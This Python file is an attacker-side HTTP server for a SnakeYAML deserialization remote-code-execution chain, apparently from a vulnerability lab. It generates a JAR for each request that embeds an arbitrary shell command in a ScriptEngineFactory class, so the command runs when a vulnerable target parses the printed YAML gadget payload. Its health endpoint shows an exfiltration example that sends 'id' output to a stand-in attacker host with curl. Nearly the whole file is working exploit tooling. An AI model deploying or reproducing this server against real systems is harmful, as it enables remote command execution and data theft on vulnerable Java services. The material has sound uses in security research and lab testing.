#!/usr/bin/env python3
"""
server.py — SPI JAR HTTP server for SnakeYAML RCE exploit.

Serves dynamically-generated JAR files for the SnakeYAML SPI gadget chain:

  SnakeYAML payload:
    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://THIS_SERVER:8099/rce.jar?cmd=ENCODED_CMD"]
      ]]
    ]

  When SnakeYAML parses the YAML above:
    1. URLClassLoader fetches /rce.jar?cmd=<cmd> from this server
    2. This server generates a JAR on-the-fly with the command embedded
    3. ScriptEngineManager discovers RceFactory via SPI (services file)
    4. ScriptEngineManager instantiates RceFactory (calls constructor)
    5. Constructor executes: Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd})

Endpoints:
  GET /rce.jar?cmd=<url-encoded-cmd>   — dynamic JAR with cmd embedded
  GET /health                          — JSON health check
  GET /                                — usage info

Port: 8099 (configurable via PORT env var)
"""

import os
import sys
import urllib.parse
import http.server
import socketserver
import json
import logging

# Add parent directory to path so we can import build_jar
sys.path.insert(0, os.path.dirname(__file__))
from build_jar import build_jar as generate_jar_bytes_to_file
from build_jar import build_class_bytes

import io
import zipfile

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger('spi-jar-server')

DEFAULT_CMD = "id"

# Cache: cmd → jar bytes (avoids regenerating for same command)
_jar_cache: dict[str, bytes] = {}


def make_jar_bytes(cmd: str) -> bytes:
    """Generate JAR bytes for the given command (in-memory, no temp file)."""
    if cmd in _jar_cache:
        return _jar_cache[cmd]

    class_bytes = build_class_bytes(cmd)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as jar:
        jar.writestr("com/vulnlab/spi/RceFactory.class", class_bytes)
        jar.writestr(
            "META-INF/services/javax.script.ScriptEngineFactory",
            "com.vulnlab.spi.RceFactory\n"
        )
        jar.writestr(
            "META-INF/MANIFEST.MF",
            "Manifest-Version: 1.0\nCreated-By: OOBserver spi-jar-server\n"
        )

    data = buf.getvalue()
    _jar_cache[cmd] = data
    return data


class SpiJarHandler(http.server.BaseHTTPRequestHandler):
    server_version = "spi-jar-server/1.0"
    log_message = lambda self, fmt, *args: log.info(
        "%s - %s" % (self.address_string(), fmt % args))

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path.rstrip('/')
        params = dict(urllib.parse.parse_qsl(parsed.query))

        if path in ('/rce.jar', '/rce.jar/'):
            self._serve_jar(params)
        elif path == '/health':
            self._serve_health()
        else:
            self._serve_index()

    def _serve_jar(self, params: dict):
        cmd = params.get('cmd', DEFAULT_CMD)
        # URL-decode in case the client double-encoded
        cmd = urllib.parse.unquote_plus(cmd)

        log.info("JAR request: cmd=%r", cmd)

        try:
            jar_bytes = make_jar_bytes(cmd)
        except Exception as e:
            log.error("Failed to generate JAR: %s", e)
            self._error(500, f"JAR generation failed: {e}")
            return

        log.info("Serving JAR: %d bytes (cmd=%r)", len(jar_bytes), cmd)
        self.send_response(200)
        self.send_header('Content-Type', 'application/java-archive')
        self.send_header('Content-Length', str(len(jar_bytes)))
        # Disable caching so each request can have a different cmd
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.end_headers()
        self.wfile.write(jar_bytes)

    def _serve_health(self):
        body = json.dumps({
            "status": "ok",
            "endpoints": [
                "GET /rce.jar?cmd=<url-encoded-command>",
                "GET /health",
                "GET /"
            ],
            "note": "JAR is generated on-the-fly per request with the given cmd",
            "example": f"http://localhost:{PORT}/rce.jar?cmd=curl+http://attacker/$(id)"
        }).encode()
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _serve_index(self):
        body = f"""SPI JAR Server — SnakeYAML RCE

Usage:
  GET /rce.jar?cmd=<url-encoded-command>  — Fetch JAR that executes <command>
  GET /health                             — Health check

SnakeYAML payload template:
  !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
      !!java.net.URL ["http://THIS_HOST:{PORT}/rce.jar?cmd=ENCODED_CMD"]
    ]]
  ]

Chain: jchains_jndi_snakeyaml
  JNDI server returns SnakeyamlRef → target parses YAML → URLClassLoader fetches this JAR
  → ScriptEngineManager SPI discovers RceFactory → constructor executes cmd
""".encode()
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _error(self, code, msg):
        body = msg.encode()
        self.send_response(code)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)


PORT = int(os.environ.get('PORT', 8099))


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Multi-threaded HTTP server — handles concurrent JAR requests."""
    allow_reuse_address = True
    daemon_threads = True


def main():
    server = ThreadedHTTPServer(('0.0.0.0', PORT), SpiJarHandler)
    log.info("SPI JAR server listening on 0.0.0.0:%d", PORT)
    log.info("Endpoint: GET /rce.jar?cmd=<url-encoded-command>")
    log.info("Health:   GET /health")
    log.info("JAR size (typical): ~2KB per command")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("Shutting down")
        server.shutdown()


if __name__ == '__main__':
    main()
